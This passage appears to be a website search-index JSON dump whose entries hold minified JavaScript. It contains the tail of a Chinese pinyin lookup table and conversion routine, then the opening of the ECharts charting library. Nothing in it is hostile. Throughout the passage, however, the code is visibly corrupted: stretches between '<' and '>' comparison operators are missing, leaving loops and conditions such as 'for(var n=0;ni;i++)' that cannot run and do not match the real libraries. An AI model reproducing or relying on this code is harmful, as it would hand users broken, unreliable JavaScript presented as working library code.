dàn\":[33211],\"tún\":[33216,33227,34508,35928,35930,36568,38677,39145,39272,39784,40064,40663],\"bì bei\":[33218],\"là gé\":[33224],\"sào sāo\":[33226],\"nào\":[33233,38297,38393,39719],\"ní luán\":[33249],\"qiān xián\":[33252],\"guàng jiǒng\":[33254],\"guǎng jiǒng\":[33257],\"chòu xiù\":[33261],\"mián biān\":[33265],\"dié zhí\":[33271],\"zhī jìn\":[33272],\"shè shě\":[33293],\"pù\":[33302,33303],\"bān bō pán\":[33324],\"kuā\":[33343],\"gèn gěn\":[33390],\"sè shǎi\":[33394],\"fú bó\":[33396],\"jiāo qiú\":[33405],\"chāi chā\":[33414],\"sháo què\":[33421],\"hù xià\":[33424],\"zì zǐ\":[33427],\"huì hū\":[33428],\"tún chūn\":[33434],\"jiè gài\":[33445],\"xù zhù\":[33447],\"yuán yán\":[33451],\"xīn xìn\":[33455],\"lún huā\":[33458],\"wù hū\":[33460],\"gōu gǒu\":[33462],\"mào máo\":[33468],\"fèi fú\":[33470],\"chán yín\":[33474],\"qiē\":[33478],\"sū sù\":[33487],\"tiáo sháo\":[33493],\"lì jī\":[33497],\"kē hē\":[33499],\"jù qǔ\":[33507],\"ruò rě\":[33509],\"zhù níng\":[33511],\"pā bó\":[33513],\"xiú\":[33516],\"zhǎ zuó\":[33522],\"jū chá\":[33524],\"nié\":[33526],\"shēng ruí\":[33532],\"qié jiā\":[33540],\"zǐ cí\":[33544],\"qiàn xī\":[33564],\"chǎi\":[33565],\"fá pèi\":[33591],\"ráo\":[33627,34136,35155,39250,39286],\"yíng xíng\":[33637],\"qián xún\":[33640,34113],\"yìn yīn\":[33643],\"hé hè\":[33655],\"shā suō\":[33678],\"péng fēng\":[33681],\"shēn xīn\":[33688],\"wǎn guān guǎn\":[33694],\"yóu sù\":[33700],\"shāo xiāo\":[33702,34552],\"làng liáng\":[33704],\"piǎo fú\":[33705],\"wèn wǎn miǎn\":[33708],\"shì shí\":[33715,33940],\"tù tú\":[33717],\"xiān liǎn\":[33718,34207],\"wǎn yù\":[33728],\"zōu chù\":[33734],\"lù lǜ\":[33737],\"jūn jùn\":[33740],\"niè rěn\":[33741],\"zī zì zāi\":[33745],\"tú tù\":[33759],\"jiē shà\":[33768],\"qiáo zhǎo\":[33772],\"tái zhī chí\":[33773],\"fēi fěi\":[33778,34586],\"qín qīn jīn\":[33779],\"zū jù\":[33785,33961],\"lǐn má\":[33787],\"tián tiàn\":[33790],\"tiē\":[33820,36028,36148],\"luò là lào luō\":[33853],\"zhù zhuó zhe\":[33879],\"shèn rèn\":[33882],\"gě gé\":[33883],\"jùn suǒ\":[33904],\"kuì kuài\":[33929],\"rú ná\":[33944],\"méng mēng měng\":[33945],\"yuán huán\":[33949],\"xú shú\":[33955],\"xí xì\":[33973],\"mì míng\":[33986],\"sōu sǒu\":[33987],\"gài gě hé hài\":[33995],\"yǎo zhuó\":[34004],\"diào tiáo dí\":[34023],\"xū qiū fū\":[34034],\"zí jú\":[34043],\"liǎo lù\":[34044],xu:[34047],\"hàn hǎn\":[34058],\"màn wàn mán\":[34067],\"pó bò\":[34082],\"fān fán bō\":[34115],\"hóng hòng\":[34171],\"yù ào\":[34177,38569],\"xí xiào\":[34178],\"báo bó bò\":[34180],\"cí zī\":[34187],\"wàn luàn\":[34189],\"kǎo hāo\":[34215],\"yuǎn wěi\":[34227],\"zhòu chóu\":[34229],\"wō mái\":[34230],\"xiāo hào\":[34243],\"yù xù xū\":[34247],\"jiè jí\":[34249],\"diào zhuó\":[34251],\"cáng zàng\":[34255],\"lǎ\":[34270],\"chú zhū\":[34296],\"pín píng\":[34315],\"gān hán\":[34423],\"hóng jiàng\":[34425],\"huī huǐ\":[34426],\"xiā há\":[34430],\"mǎ mà mā\":[34434],\"fāng bàng\":[34436],\"bàng bèng\":[34444],\"jué quē\":[34455],\"qín qián\":[34457],\"gōng zhōng\":[34467],\"fǔ fù\":[34469],\"dài dé\":[34478],\"gǒu qú xù\":[34492],\"bǒ pí\":[34494],\"shé yí\":[34503],\"tiě\":[34504,37444,37525,37921,37941,38081,39510],\"gé luò\":[34514],\"máng bàng\":[34518],\"yì xǔ\":[34529],\"há gé\":[34532],\"qiè ní\":[34538],\"é yǐ\":[34558],\"zhē zhé\":[34567],\"là zhà\":[34593],\"suò\":[34614,36900],\"yóu qiú\":[34660],\"xiā hā\":[34662],\"xī qī\":[34695],\"bī pí\":[34709],\"nài něng\":[34714],\"hé xiá\":[34715],\"guì huǐ\":[34717],\"mǎ mā mà\":[34718],\"shì zhē\":[34731],\"zhì dié\":[34738],\"jiàn chán\":[34745],\"ma má mò\":[34758],\"mǎng měng\":[34770],\"biē bié\":[34782],\"bēn fèi\":[34790],\"láo liáo\":[34791],\"yín xún\":[34795],\"lí lǐ\":[34849],\"xuè xiě\":[34880],\"xíng háng hàng héng\":[34892],\"shuāi cuī\":[34928],\"tuó tuō\":[34953],\"lǐng líng\":[34954],\"bào páo pào\":[34956],\"jù jiē\":[34963],\"hè kè\":[34964],\"yí yì\":[34968,36004],\"nà jué\":[34982],\"bèi pī\":[34987],\"chǐ nuǒ\":[34994],\"chǐ qǐ duǒ nuǒ\":[34995],\"jiá qiā jié\":[34999],\"bó mò\":[35001],\"guī guà\":[35007],\"liè liě\":[35010],\"chéng chěng\":[35022],\"jiē gé\":[35027],\"dāo chóu\":[35055],\"shang cháng\":[35059],\"yuān gǔn\":[35063],\"yǎn ān\":[35066],\"tì xī\":[35068],\"fù fú\":[35092],\"chǔ zhǔ\":[35098],\"tuì tùn\":[35114],\"lǎi\":[35184],\"yào yāo\":[35201],\"qín tán\":[35203],\"jiàn xiàn\":[35211,35265],\"piǎn\":[35217,35550,35869,36021],\"piē miè\":[35221],\"yíng yǐng\":[35246],\"qù qū\":[35248,35255,35281],\"jiàn biǎn\":[35253],\"luó luǎn\":[35254],\"zī zuǐ\":[35292],\"huà xiè\":[35295],\"jiě jiè xiè\":[35299,35303],\"xué hù\":[35319],\"lì lù\":[35323],\"tǎo\":[35342,35752],\"zhùn\":[35376],\"zī zǐ\":[35390],\"yí dài\":[35410,35794],\"xiòng\":[35415,35783],\"diào tiǎo\":[35458],\"yí chǐ chì\":[35459],\"lǎng làng\":[35471],\"ēi éi ěi èi xī\":[35474,35830],\"shuà\":[35484],\"yǔ yù\":[35486,35821,38632],\"shuō shuì yuè\":[35498,35828],\"shuí shéi\":[35504,35841],\"qū juè\":[35507],\"chī lài\":[35514],\"nì ná\":[35517],\"diào tiáo\":[35519],\"pǐ bēi\":[35520],\"jì jī\":[35525],\"zé zuò zhǎ cuò\":[35534],\"chù jí\":[35540],\"háo xià\":[35541],\"lùn lún\":[35542,35770],\"shì dì\":[35551],\"huà guā\":[35555],\"xǐ shāi āi\":[35568],\"nán nàn\":[35573,38627],\"miù\":[35628,35884],\"zèn\":[35670,35886],\"shí zhì\":[35672,35782],\"juàn xuān\":[35714],\"yí tuī\":[35721],\"zhán\":[35741],\"xǔ hǔ\":[35768],\"xiáng yáng\":[35814],\"tiáo diào zhōu\":[35843],\"chén shèn\":[35852],\"mí mèi\":[35868],\"màn mán\":[35881],\"gǔ yù\":[35895],\"huō huò huá\":[35905],\"zhì zhài\":[35960],\"huān huán\":[35974],\"kěn kūn\":[35975],\"mò hé\":[35976],\"mò hé háo\":[35977],\"jù lóu\":[35991],\"zé zhài\":[36012,36131],\"dài tè\":[36024],\"bì bēn\":[36033],\"jiǎ gǔ jià\":[36040],\"xiōng mín\":[36079],\"càng\":[36086],\"zhuàn zuàn\":[36090,36186],\"wàn zhuàn\":[36099],\"gàn gòng zhuàng\":[36123],\"yuán yùn\":[36128],\"bēn bì\":[36146],\"jiǎ gǔ\":[36158],\"zǒu\":[36208,36209,39888],\"dié tú\":[36227],\"jū qiè\":[36228],\"qū cù\":[36235,36264],\"jí jié\":[36236],\"guā huó\":[36239],\"què qì jí\":[36254],\"tàng tāng\":[36255],\"chuō zhuó\":[36256],\"qù cù\":[36259],\"yuè tì\":[36271],\"bō bào\":[36277],\"kuà wù\":[36278],\"guì jué\":[36281],\"fāng fàng páng\":[36285],\"páo bà\":[36289],\"qí qǐ\":[36290],\"jiàn chén\":[36296],\"pǎo páo\":[36305],\"diǎn diē tiē\":[36309],\"jū jù qiè\":[36313],\"bǒ\":[36315],\"luò lì\":[36318],\"dài duò duō chí\":[36322],\"zhuǎi\":[36329],\"bèng pián\":[36336],\"tiào táo\":[36339],\"shū chōu\":[36350],\"liàng liáng\":[36361],\"tà tā\":[36367],\"chǎ\":[36421,37972,38258],\"dí zhí\":[36450],\"dēng dèng\":[36460,37913,38251],\"cèng\":[36461],\"dūn cún\":[36466],\"juě jué\":[36470],\"liāo\":[36477],\"xiè sǎ\":[36512],\"tǐ\":[36528,36550,39605],\"yà zhá gá\":[36555],\"xìn xiàn\":[36560],\"fàn guǐ\":[36563],\"zhuàn zhuǎn\":[36578],\"zhóu zhòu\":[36600,36724],\"bú\":[36688,37293,40170],\"zhuǎn zhuàn zhuǎi\":[36716],\"zǎi zài\":[36733],\"niǎn zhǎn\":[36759],\"biān bian\":[36793],\"dào biān\":[36794],\"yǐ yí\":[36806,36836,36849],\"guò guo guō\":[36807],\"wàng kuāng\":[36811],\"hái huán\":[36824],\"zhè zhèi\":[36825],\"yuǎn yuàn\":[36828],\"zhì lì\":[36835],\"zhù wǎng\":[36844],\"zhuī duī\":[36861],\"shì kuò\":[36866],\"tòu\":[36879],\"tōng tòng\":[36890],\"guàng\":[36891],\"dǎi dài\":[36910],\"suì suí\":[36930],\"tí dì\":[36934],\"yí wèi\":[36951],\"shì dí zhé\":[36969],\"cà\":[36970],\"huán hái\":[36996],\"lí chí\":[37004],\"kàng háng\":[37023],\"nà nèi nā\":[37027],\"xié yá yé yú xú\":[37034],\"gāi hái\":[37058],\"huán xún\":[37063],\"chī xī\":[37079],\"hǎo\":[37085],\"lì zhí\":[37094],\"xiáo ǎo\":[37097],\"dōu dū\":[37117],\"liǎo\":[37149,38269],\"zàn cuán cuó\":[37186,37191],\"dīng dǐng\":[37194],\"cù zuò\":[37218],\"fā pō\":[37222],\"shāi shī\":[37246],\"niàng\":[37247,37304],\"qiú chōu\":[37268],\"pō fā\":[37271,37297],\"chǎn chěn\":[37286],\"yàn liǎn xiān\":[37302],\"niàng niáng\":[37312],\"lǐ li\":[37324],\"lí xǐ xī\":[37328],\"liǎo liào\":[37333],\"dīng dìng\":[37336,38025],\"qiǎo jiǎo\":[37349],\"yú huá\":[37354],\"huá wū\":[37355],\"rì rèn jiàn\":[37360,37372],\"dì dài\":[37361],\"pī zhāo\":[37373],\"yá yé\":[37374],\"bǎ pá\":[37376,38063],\"tā tuó\":[37448,38090],\"běi\":[37491],\"bǐng píng\":[37500],\"hā kē\":[37503,38122],\"chòng\":[37507,38131],\"xiǎng jiōng\":[37508],\"yù sì\":[37513],\"xù huì\":[37514],\"rén rěn\":[37515],\"shàn shuò\":[37519],\"chì lì\":[37520],\"xiǎn xǐ\":[37521,38115],\"hóu xiàng\":[37527],\"diào tiáo yáo\":[37530],\"xiān kuò tiǎn guā\":[37531,37565,38118],\"zhé niè\":[37560],\"zhōng yōng\":[37567],\"tōu tù dòu\":[37568],\"méi méng\":[37570],\"wàn jiǎn\":[37572,37803],\"tǐng dìng\":[37580,38116],\"juān jiān cuān\":[37585],\"sī tuó\":[37590],\"juān xuān juàn\":[37591],\"wú huá wū\":[37592],\"zhuó chuò\":[37596],\"xíng xìng jīng\":[37598],\"jū jú\":[37606,38164],\"zuì niè\":[37623],\"yuān yuǎn wǎn wān\":[37626],\"gāng gàng\":[37628,38050],\"zhuī\":[37648,38181,39429,39571,40315],\"ā\":[37650,38165],\"cuō chā\":[37768],\"suǒ sè\":[37773],\"yáo zú\":[37776],\"yè tà gé\":[37777],\"qiāng chēng\":[37783],\"gé lì\":[37784,38217,39730],\"bī pī bì\":[37790],\"gǎo hào\":[37804],\"zú chuò\":[37827],\"xiū xiù\":[37829],\"shòu sōu\":[37833],\"dí dī\":[37841,38237],\"qiāo sǎn càn\":[37842],\"lù áo\":[37845],\"tāng táng\":[37852],\"jiàn zàn\":[37865],\"huì suì ruì\":[37880],\"qiǎng qiāng\":[37881,38250],\"sǎn xiàn sà\":[37886],\"jiǎn jiàn\":[37927,38159],\"dāng chēng\":[37946,38107],\"zuān zuàn\":[38013],\"sà xì\":[38033],\"yào yuè\":[38053],\"tǒu dǒu\":[38061],\"zuàn zuān\":[38075],\"qiān yán\":[38085],\"pí pī\":[38093],\"yáo diào tiáo\":[38123],\"tāng tàng\":[38132],\"pù pū\":[38138],\"tán xiān\":[38188],\"liù liú\":[38223],\"hào gǎo\":[38224],\"táng tāng\":[38231],\"tán chán xín\":[38241],\"huò shǎn\":[38276],\"hàn bì\":[38280,38380],\"kāng kàng\":[38284,38390],\"xián jiàn jiān jiǎn\":[38290],\"xiā xiǎ\":[38293],\"xiǎ kě\":[38300],\"biàn guān\":[38302],\"hé gé\":[38308,39052],\"hòng xiàng\":[38311],\"sē xī\":[38314],\"tíng tǐng\":[38318],\"è yān\":[38332,38415],\"hòng juǎn xiàng\":[38338],\"bǎn pàn\":[38342],\"dū shé\":[38349,38407],\"què quē\":[38357],\"tāng táng chāng\":[38363],\"kàn hǎn\":[38366,38426],\"xì sè tà\":[38367],\"mēn mèn\":[38391],\"quē què\":[38425],\"yán diàn\":[38461],\"ā ē\":[38463],\"bēi pō pí\":[38466],\"yàn yǎn\":[38529],\"yú yáo shù\":[38531],\"lóng lōng\":[38534],\"duì zhuì\":[38538],\"suí duò\":[38539],\"gāi qí ái\":[38545],\"huī duò\":[38547,38579],\"wěi kuí\":[38551],\"lì dài\":[38584],\"zhuī cuī wéi\":[38585],\"hè hú\":[38586,40366],\"jùn juàn\":[38589,38603],\"nán nàn nuó\":[38590],\"què qiāo qiǎo\":[38592],\"guàn huán\":[38618],\"guī xī\":[38623],\"sè xí\":[38637],\"án\":[38648],\"wù méng\":[38650],\"tèng\":[38703],\"lù lòu\":[38706],\"mái\":[38718],\"jìng liàng\":[38746],\"gé jí\":[38761],\"bǎ\":[38774],\"yāng yàng\":[38789],\"gé tà sǎ\":[38792],\"biān yìng\":[38805],\"qiào shāo\":[38808],\"juān xuān\":[38809],\"shàng zhǎng\":[38813],\"pí bǐng bì bēi\":[38814],la:[38817],\"xiè dié\":[38818],\"ēng\":[38821],\"móu mù\":[38826],\"bì bǐng\":[38840],\"mèi wà\":[38862],\"rǒu\":[38870],\"shè xiè\":[38872],\"yùn wēn\":[38891],\"dùn dú\":[38931,39039],\"duǐ\":[38951],\"luō\":[38961],\"bīn pín\":[38971],\"yóng\":[38994,39065,39979],\"mān\":[39010,39071],\"jǐng gěng\":[39048],\"jié xié jiá\":[39049],\"kē ké\":[39055],\"pín bīn\":[39057],\"chàn zhàn\":[39076],\"fēng fěng\":[39080,39118],\"biāo diū\":[39081],\"bá fú\":[39088],\"sāo sōu\":[39102],\"liù liáo\":[39106],\"shí sì yì\":[39135],\"yǎng juàn\":[39148],\"zhù tǒu\":[39155],\"yí sì\":[39156],\"zuò zé zhā\":[39157],\"tiè\":[39163,39214],\"xiǎng náng\":[39263],\"táng xíng\":[39271],\"gē le\":[39289],\"chā zha\":[39303],\"náng nǎng\":[39317],\"yūn wò\":[39335],\"zhī shì\":[39350],\"xìn jìn\":[39352],\"kuài jué\":[39363],\"zǎng\":[39380,39541],\"tái dài\":[39384],\"xún xuān\":[39400],\"liáng láng\":[39418],\"piàn\":[39447,39449,39575,39800],\"dài tái\":[39552],\"sāo sǎo\":[39578],\"gǔ gū\":[39592],\"bèi mó\":[39603],\"xiāo qiāo\":[39609],\"bǎng pǎng\":[39624],\"bó jué\":[39625],\"bì pǒ\":[39666],\"máo méng\":[39667],\"kuò yuè\":[39674],\"bā bà\":[39774,40067],\"jì cǐ\":[39814],\"bó bà\":[39818],\"zhǎ zhà\":[39827,40074],\"chóu dài\":[39832],\"luò gé\":[39845],\"guī xié wā kuí\":[39853],\"xiān xiǎn\":[39854,40092],\"pū bū\":[39878],\"yì sī\":[39907],\"bà bó\":[40076],\"guī xié\":[40081],\"sāi xǐ\":[40131],\"niǎo diǎo\":[40165],\"diāo zhāo\":[40173],\"gān hàn yàn\":[40177],\"fū guī\":[40186],\"jiān qiān zhān\":[40189],\"hé jiè\":[40353],\"piān biǎn\":[40355],\"chuàn zhì\":[40360],\"cāng qiāng\":[40364],\"sǔn xùn\":[40381],\"biāo páo\":[40579],\"zhù cū\":[40582],\"jūn qún\":[40583,40597],chi:[40630],\"mó me\":[40636],\"mó me ma\":[40637],\"mí mǒ\":[40639],\"dàn shèn\":[40686],\"zhěn yān\":[40688],\"dǎn zhǎn\":[40693],\"miǎn mǐn měng\":[40702],\"hōu\":[40769],\"nàng\":[40777],\"qí jì zī zhāi\":[40784],\"yín kěn yǎn\":[40834],\"yín kěn\":[40840],\"gōng wò\":[40847],\"guī jūn qiū\":[40860,40863]},u=[];Object.keys(i).forEach((function(n){for(var h=0,g=i[n];h=19968&&h5)return b(n,5,{nonZh:o});var y=\"\",j=!1;if(1===h){for(var c=0;c-1){var p=n.slice(0,f),r=p?b(p,p.length,{nonZh:o})+\" \":\"\",k=n.slice(f+m.length),e=k?\" \"+b(k,k.length,{nonZh:o}):\"\";y=\"\"+r+l[h][m]+e;break}}return y||b(n,h-1,{nonZh:o})},x=function(n,h){var i=h.nonZh,u=n;for(var z in g){var s=u.indexOf(z);if(s>-1){var o=n.slice(0,s),y=o?b(o,o.length,{mode:\"surname\",nonZh:i})+\" \":\"\",j=n.slice(s+z.length),c=j?\" \"+b(j,j.length,{mode:\"surname\",nonZh:i}):\"\";return\"\"+y+g[z]+c}}return b(n,n.length,{nonZh:i})},t=function(n,h){var g=h.mode,i=h.nonZh,u=j(),z=n;for(var s in u){var o=z.indexOf(s);if(o>-1){var y=n.slice(0,o),c=y?b(y,y.length,{mode:g,useCustomConfig:!0,nonZh:i})+\" \":\"\",l=n.slice(o+s.length),d=l?\" \"+b(l,l.length,{mode:g,useCustomConfig:!0,nonZh:i}):\"\";return\"\"+c+u[s]+d}}return b(n,n.length,{mode:g,nonZh:i})},q=function(n){return n.replace(/(ā|á|ǎ|à)/g,\"a\").replace(/(ō|ó|ǒ|ò)/g,\"o\").replace(/(ē|é|ě|è)/g,\"e\").replace(/(ī|í|ǐ|ì)/g,\"i\").replace(/(ū|ú|ǔ|ù)/g,\"u\").replace(/(ǖ|ǘ|ǚ|ǜ)/g,\"ü\").replace(/(ń|ň|ǹ)/g,\"n\")},w=function(n){for(var g=[],i=[],u=0,z=n.split(\" \");u","tags":""},{"title":"","url":"/lib/echarts.min.js","text":"!function(t,e){\"object\"==typeof exports&&\"undefined\"!=typeof module?e(exports):\"function\"==typeof define&&define.amd?define([\"exports\"],e):e(t.echarts={})}(this,function(t){\"use strict\";function e(t,e){function n(){this.constructor=t}if(\"function\"!=typeof e&&null!==e)throw new TypeError(\"Class extends value \"+String(e)+\" is not a constructor or null\");om(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}function n(t,e){var n=e.browser,i=t.match(/Firefox\\/([\\d.]+)/),r=t.match(/MSIE\\s([\\d.]+)/)||t.match(/Trident\\/.+?rv:(([\\d.]+))/),o=t.match(/Edge?\\/([\\d.]+)/),a=/micromessenger/i.test(t);i&&(n.firefox=!0,n.version=i[1]),r&&(n.ie=!0,n.version=r[1]),o&&(n.edge=!0,n.version=o[1],n.newEdge=+o[1].split(\".\")[0]>18),a&&(n.weChat=!0),e.svgSupported=\"undefined\"!=typeof SVGRect,e.touchEventsSupported=\"ontouchstart\"in window&&!n.ie&&!n.edge,e.pointerEventsSupported=\"onpointerdown\"in window&&(n.edge||n.ie&&+n.version>=11),e.domSupported=\"undefined\"!=typeof document;var s=document.documentElement.style;e.transform3dSupported=(n.ie&&\"transition\"in s||n.edge||\"WebKitCSSMatrix\"in window&&\"m11\"in new WebKitCSSMatrix||\"MozPerspective\"in s)&&!(\"OTransition\"in s),e.transformSupported=e.transform3dSupported||n.ie&&+n.version>=9}function i(t){var e={};if(\"undefined\"==typeof JSON)return e;for(var n=0;ni;i++)e[i]=t[i]}}}else if(!ym[n]&&!X(t)&&!P(t)){e={};for(var a in t)t.hasOwnProperty(a)&&a!==Im&&(e[a]=s(t[a]))}return e}function l(t,e,n){if(!k(e)||!k(t))return n?s(e):t;for(var i in e)if(e.hasOwnProperty(i)&&i!==Im){var r=t[i],o=e[i];!k(o)||!k(r)||M(o)||M(r)||P(o)||P(r)||A(o)||A(r)||X(o)||X(r)?!n&&i in t||(t[i]=s(e[i])):l(r,o,n)}return t}function u(t,e){for(var n=t[0],i=1,r=t.length;r>i;i++)n=l(n,t[i],e);return n}function h(t,e){if(Object.assign)Object.assign(t,e);else for(var n in e)e.hasOwnProperty(n)&&n!==Im&&(t[n]=e[n]);return t}function c(t,e,n){for(var i=b(e),r=0;rn;n++)if(t[n]===e)return n}return-1}function d(t,e){function n(){}var i=t.prototype;n.prototype=e.prototype,t.prototype=new n;for(var r in i)i.hasOwnProperty(r)&&(t.prototype[r]=i[r]);t.prototype.constructor=t,t.superClass=e}function f(t,e,n){if(t=\"prototype\"in t?t.prototype:t,e=\"prototype\"in e?e.prototype:e,Object.getOwnPropertyNames)for(var i=Object.getOwnPropertyNames(e),r=0;ri;i++)e.call(n,t[i],i,t);else for(var o in t)t.hasOwnProperty(o)&&e.call(n,t[o],o,t)}function y(t,e,n){if(!t)return[];if(!e)return V(t);if(t.map&&t.map===Mm)return t.map(e,n);for(var i=[],r=0,o=t.length;o>r;r++)i.push(e.call(n,t[r],r,t));return i}function m(t,e,n,i){if(t&&e){for(var r=0,o=t.length;o>r;r++)n=e.call(i,n,t[r],r,t);return n}}function _(t,e,n){if(!t)return[];if(!e)return V(t);if(t.filter&&t.filter===wm)return t.filter(e,n);for(var i=[],r=0,o=t.length;o>r;r++)e.call(n,t[r],r,t)&&i.push(t[r]);return i}function x(t,e,n){if(t&&e)for(var i=0,r=t.length;r>i;i++)if(e.call(n,t[i],i,t))return t[i]}function b(t){if(!t)return[];if(Object.keys)return Object.keys(t);var e=[];for(var n in t)t.hasOwnProperty(n)&&e.push(n);return e}function w(t,e){for(var n=[],i=2;i>=1;return t+e}function Ve(t,e,n,i){var r=e+1;if(r===n)return 1;if(i(t[r++],t[e])r&&i(t[r],t[r-1])r&&i(t[r],t[r-1])>=0;)r++;return r-e}function He(t,e,n){for(n--;n>e;){var i=t[e];t[e++]=t[n],t[n--]=i}}function Ge(t,e,n,i,r){for(i===e&&i++;n>i;i++){for(var o,a=t[i],s=e,l=i;l>s;)o=s+l>>>1,r(a,t[o])0;)t[s+u]=t[s+u-1],u--}t[s]=a}}function We(t,e,n,i,r,o){var a=0,s=0,l=1;if(o(t,e[n+r])>0){for(s=i-r;s>l&&o(t,e[n+r+l])>0;)a=l,l=(ls&&(l=s),a+=r,l+=r}else{for(s=r+1;s>l&&o(t,e[n+r-l])a;){var h=a+(l-a>>>1);o(t,e[n+h])>0?a=h+1:l=h}return l}function Ue(t,e,n,i,r,o){var a=0,s=0,l=1;if(o(t,e[n+r])l&&o(t,e[n+r-l])l&&o(t,e[n+r+l])>=0;)a=l,l=(ls&&(l=s),a+=r,l+=r}for(a++;l>a;){var h=a+(l-a>>>1);o(t,e[n+h])1;){var t=c-2;if(t>=1&&u[t-1]=2&&u[t-2]1;){var t=c-2;t>0&&u[t-1]=r?a(i,r,o,h):s(i,r,o,h)))}function a(n,i,r,o){var a=0;for(a=0;i>a;a++)p[a]=t[n+a];var s=0,l=r,u=n;if(t[u++]=t[l++],0!==--o){if(1===i){for(a=0;o>a;a++)t[u+a]=t[l+a];return void(t[u+o]=p[s])}for(var c,d,f,g=h;;){c=0,d=0,f=!1;do if(e(t[l],p[s])(c|d));if(f)break;do{if(c=Ue(t[l],p,s,i,0,e),0!==c){for(a=0;c>a;a++)t[u+a]=p[s+a];if(u+=c,s+=c,i-=c,1>=i){f=!0;break}}if(t[u++]=t[l++],0===--o){f=!0;break}if(d=We(p[s],t,l,o,0,e),0!==d){for(a=0;d>a;a++)t[u+a]=t[l+a];if(u+=d,l+=d,o-=d,0===o){f=!0;break}}if(t[u++]=p[s++],1===--i){f=!0;break}g--}while(c>=o_||d>=o_);if(f)break;0>g&&(g=0),g+=2}if(h=g,1>h&&(h=1),1===i){for(a=0;o>a;a++)t[u+a]=t[l+a];t[u+o]=p[s]}else{if(0===i)throw new Error;for(a=0;i>a;a++)t[u+a]=p[s+a]}}else for(a=0;i>a;a++)t[u+a]=p[s+a]}function s(n,i,r,o){var a=0;for(a=0;o>a;a++)p[a]=t[r+a];var s=n+i-1,l=o-1,u=r+o-1,c=0,d=0;if(t[u--]=t[s--],0!==--i){if(1===o){for(u-=i,s-=i,d=u+1,c=s+1,a=i-1;a>=0;a--)t[d+a]=t[c+a];return void(t[u]=p[l])}for(var f=h;;){var g=0,v=0,y=!1;do if(e(p[l],t[s])(g|v));if(y)break;do{if(g=i-Ue(p[l],t,n,i,i-1,e),0!==g){for(u-=g,s-=g,i-=g,d=u+1,c=s+1,a=g-1;a>=0;a--)t[d+a]=t[c+a];if(0===i){y=!0;break}}if(t[u--]=p[l--],1===--o){y=!0;break}if(v=o-We(t[s],p,0,o,o-1,e),0!==v){for(u-=v,l-=v,o-=v,d=u+1,c=l+1,a=0;v>a;a++)t[d+a]=p[c+a];if(1>=o){y=!0;break}}if(t[u--]=t[s--],0===--i){y=!0;break}f--}while(g>=o_||v>=o_);if(y)break;0>f&&(f=0),f+=2}if(h=f,1>h&&(h=1),1===o){for(u-=i,s-=i,d=u+1,c=s+1,a=i-1;a>=0;a--)t[d+a]=t[c+a];t[u]=p[l]}else{if(0===o)throw new Error;for(c=u-(o-1),a=0;o>a;a++)t[c+a]=p[a]}}else for(c=u-(o-1),a=0;o>a;a++)t[c+a]=p[a]}var l,u,h=o_,c=0,p=[];return l=[],u=[],{mergeRuns:i,forceMergeRuns:r,pushRun:n}}function Ye(t,e,n,i){n||(n=0),i||(i=t.length);var r=i-n;if(!(2>r)){var o=0;if(r_>r)return o=Ve(t,n,i,e),void Ge(t,n,i,n+o,e);var a=Xe(t,e),s=Fe(r);do{if(o=Ve(t,n,i,e),s>o){var l=r;l>s&&(l=s),Ge(t,n,n+l,n+o,e),o=l}a.pushRun(n,o),a.mergeRuns(),r-=o,n+=o}while(0!==r);a.forceMergeRuns()}}function qe(){u_||(u_=!0,console.warn(\"z / z2 / zlevel of displayable is invalid, which may cause unexpected errors\"))}function je(t,e){return t.zlevel===e.zlevel?t.z===e.z?t.z2-e.z2:t.z-e.z:t.zlevel-e.zlevel}function Ze(t){return t>-g_&&g_>t}function Ke(t){return t>g_||-g_>t}function $e(t,e,n,i,r){var o=1-r;return o*o*(o*t+3*r*e)+r*r*(r*i+3*o*n)}function Qe(t,e,n,i,r){var o=1-r;return 3*(((e-t)*o+2*(n-e)*r)*o+(i-n)*r*r)}function Je(t,e,n,i,r,o){var a=i+3*(e-n)-t,s=3*(n-2*e+t),l=3*(e-t),u=t-r,h=s*s-3*a*l,c=s*l-9*a*u,p=l*l-3*s*u,d=0;if(Ze(h)&&Ze(c))if(Ze(s))o[0]=0;else{var f=-l/s;f>=0&&1>=f&&(o[d++]=f)}else{var g=c*c-4*h*p;if(Ze(g)){var v=c/h,f=-s/a+v,y=-v/2;f>=0&&1>=f&&(o[d++]=f),y>=0&&1>=y&&(o[d++]=y)}else if(g>0){var m=f_(g),_=h*s+1.5*a*(-c+m),x=h*s+1.5*a*(-c-m);_=0>_?-d_(-_,m_):d_(_,m_),x=0>x?-d_(-x,m_):d_(x,m_);var f=(-s-(_+x))/(3*a);f>=0&&1>=f&&(o[d++]=f)}else{var b=(2*h*s-3*a*c)/(2*f_(h*h*h)),w=Math.acos(b)/3,S=f_(h),M=Math.cos(w),f=(-s-2*S*M)/(3*a),y=(-s+S*(M+y_*Math.sin(w)))/(3*a),T=(-s+S*(M-y_*Math.sin(w)))/(3*a);f>=0&&1>=f&&(o[d++]=f),y>=0&&1>=y&&(o[d++]=y),T>=0&&1>=T&&(o[d++]=T)}}return d}function tn(t,e,n,i,r){var o=6*n-12*e+6*t,a=9*e+3*i-3*t-9*n,s=3*e-3*t,l=0;if(Ze(a)){if(Ke(o)){var u=-s/o;u>=0&&1>=u&&(r[l++]=u)}}else{var h=o*o-4*a*s;if(Ze(h))r[0]=-o/(2*a);else if(h>0){var c=f_(h),u=(-o+c)/(2*a),p=(-o-c)/(2*a);u>=0&&1>=u&&(r[l++]=u),p>=0&&1>=p&&(r[l++]=p)}}return l}function en(t,e,n,i,r,o){var a=(e-t)*r+t,s=(n-e)*r+e,l=(i-n)*r+n,u=(s-a)*r+a,h=(l-s)*r+s,c=(h-u)*r+u;o[0]=t,o[1]=a,o[2]=u,o[3]=c,o[4]=c,o[5]=h,o[6]=l,o[7]=i}function nn(t,e,n,i,r,o,a,s,l,u,h){var c,p,d,f,g,v=.005,y=1/0;__[0]=l,__[1]=u;for(var m=0;1>m;m+=.05)x_[0]=$e(t,n,r,a,m),x_[1]=$e(e,i,o,s,m),f=Bm(__,x_),y>f&&(c=m,y=f);y=1/0;for(var _=0;32>_&&!(v_>v);_++)p=c-v,d=c+v,x_[0]=$e(t,n,r,a,p),x_[1]=$e(e,i,o,s,p),f=Bm(x_,__),p>=0&&y>f?(c=p,y=f):(b_[0]=$e(t,n,r,a,d),b_[1]=$e(e,i,o,s,d),g=Bm(b_,__),1>=d&&y>g?(c=d,y=g):v*=.5);return h&&(h[0]=$e(t,n,r,a,c),h[1]=$e(e,i,o,s,c)),f_(y)}function rn(t,e,n,i,r,o,a,s,l){for(var 